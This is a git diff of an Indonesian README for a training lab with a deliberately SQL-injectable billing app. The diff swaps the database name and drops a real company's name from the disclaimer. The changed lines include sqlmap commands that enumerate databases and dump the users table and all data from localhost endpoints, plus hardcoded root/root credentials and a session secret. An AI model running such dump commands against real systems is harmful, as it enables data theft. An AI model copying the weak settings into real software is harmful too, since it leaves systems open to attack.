@@ -1,7 +1,7 @@
 # Deploy Web & SQL Injection dengan SQLMap
 
 > ⚠️ **Hanya untuk pembelajaran.**
-> Proyek ini dibuat murni sebagai bahan latihan keamanan web. Ini **bukan** aplikasi resmi, **bukan** produk, dan **tidak berafiliasi** dengan PDAM Tirta Asasta Depok atau perusahaan mana pun. Semua nama, data, dan kredensial di sini adalah contoh/fiktif. Jangan dipakai di produksi maupun untuk aktivitas ilegal.
+> Proyek ini dibuat murni sebagai bahan latihan keamanan web. Ini **bukan** aplikasi resmi, **bukan** produk, dan **tidak berafiliasi** dengan perusahaan mana pun. Semua nama, data, dan kredensial di sini adalah contoh/fiktif. Jangan dipakai di produksi maupun untuk aktivitas ilegal.
 
 Dokumen ini menjelaskan dua hal:
 
@@ -79,7 +79,7 @@ docker compose up -d
 
 | Container | Port | Deskripsi |
 |-----------|------|-----------|
-| `pdam-mysql` | 3306 | MySQL dengan database `pdam_tirta_asasta`, tabel & seed sudah terisi |
+| `pdam-mysql` | 3306 | MySQL dengan database `pdam_db`, tabel & seed sudah terisi |
 | `pdam-app` | 3000 | Aplikasi Express, otomatis konek ke MySQL lewat `DB_HOST=db` |
 
 ### Verifikasi
@@ -121,7 +121,7 @@ mysql -u root -p < db/init.sql
 
 Perintah ini membuat:
 
-- Database `pdam_tirta_asasta`
+- Database `pdam_db`
 - Tabel `users`, `customers`, `bills`
 - Seed: 3 user, 10 pelanggan, 18 tagihan
 
@@ -140,7 +140,7 @@ DB_HOST=localhost
 DB_PORT=3306
 DB_USER=root
 DB_PASSWORD=root
-DB_NAME=pdam_tirta_asasta
+DB_NAME=pdam_db
 PORT=3000
 SESSION_SECRET=supersecretkey123
 ```
@@ -343,21 +343,21 @@ sqlmap -u 'http://localhost:3000/api/cek-tagihan?no_sambung=TA2023001' --batch
 
 # Daftar database
 sqlmap -u 'http://localhost:3000/api/cek-tagihan?no_sambung=TA2023001' --batch --dbs
-# → information_schema, mysql, performance_schema, pdam_tirta_asasta, sys
+# → information_schema, mysql, performance_schema, pdam_db, sys
 
 # Dump tabel users
 sqlmap -u 'http://localhost:3000/api/cek-tagihan?no_sambung=TA2023001' --batch \
-  -D pdam_tirta_asasta -T users --dump
+  -D pdam_db -T users --dump
 
 # Dump seluruh database
 sqlmap -u 'http://localhost:3000/api/cek-tagihan?no_sambung=TA2023001' --batch \
-  -D pdam_tirta_asasta --dump-all
+  -D pdam_db --dump-all
 ```
 
 **Hasil:**
 
 ```
-Database: pdam_tirta_asasta
+Database: pdam_db
 Table: users
 +----+-----------+-----------+----------+---------------------+
 | id | username  | password  | role     | nama_lengkap        |
@@ -575,7 +575,7 @@ sqlmap -u 'http://localhost:3000/api/cek-tagihan?no_sambung=TA2023001' \
 
 ```bash
 sqlmap -u 'http://localhost:3000/api/cek-tagihan?no_sambung=TA2023001' \
-  --batch -D pdam_tirta_asasta --dump-all \
+  --batch -D pdam_db --dump-all \
   --output-dir=./sqlmap-results
 ```
 
@@ -599,7 +599,7 @@ TOKEN=$(curl -s -X POST http://localhost:3000/api/login \
 
 sqlmap -u 'http://localhost:3000/api/customers?search=ahmad' \
   -H "Authorization: Bearer $TOKEN" \
-  -p search --batch -D pdam_tirta_asasta -T users --dump
+  -p search --batch -D pdam_db -T users --dump
 ```
 
 ---
